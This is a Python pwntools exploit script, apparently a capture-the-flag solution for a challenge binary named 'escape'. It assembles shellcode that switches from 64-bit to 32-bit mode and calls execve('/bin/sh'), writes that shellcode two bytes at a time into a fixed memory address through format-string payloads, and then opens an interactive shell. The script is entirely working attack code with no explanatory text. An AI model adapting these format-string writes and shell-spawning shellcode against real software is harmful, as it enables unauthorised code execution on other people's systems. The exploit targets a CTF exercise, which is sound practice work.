# -- coding: utf-8 --
from pwn import *
# context.log_level = 'debug'
# context.arch = 'amd64'
# ENV
e = context.binary = ELF('./escape')
lib = e.libc
r = process("./escape")
# r=remote("escape.sstf.site", 5051)

offset = 8
shellcode_addr = 0x50510000

shellcode =('''
mov rsp, 0x50510500
mov DWORD PTR [rsp], 0x50510100
''')

shellcode +=(shellcraft.amd64.linux.amd64_to_i386())
shellcode = asm(shellcode).ljust(0x20, b"\x90")


shellcode+=asm('''
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push b'/bin/sh\x00' */

    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call execve() */
    mov eax, 0xb 
    int 0x80

''')

print(disasm(shellcode))
print(len(shellcode))

for addr in range(shellcode_addr, shellcode_addr+56, 8):
    log.info("addr: %#x" %addr)
    for i in range(0,8,2):
        minishell = shellcode[:2]
        shellcode= shellcode[2:]
        payload = fmtstr_payload(offset, {addr+i: minishell}, write_size='short')
        print(b"shellcode: "+minishell)
        print(b"payload: "+(payload))
        r.sendlineafter(b'Enter: ', payload)

pause()
r.sendline(b'done')


r.interactive()
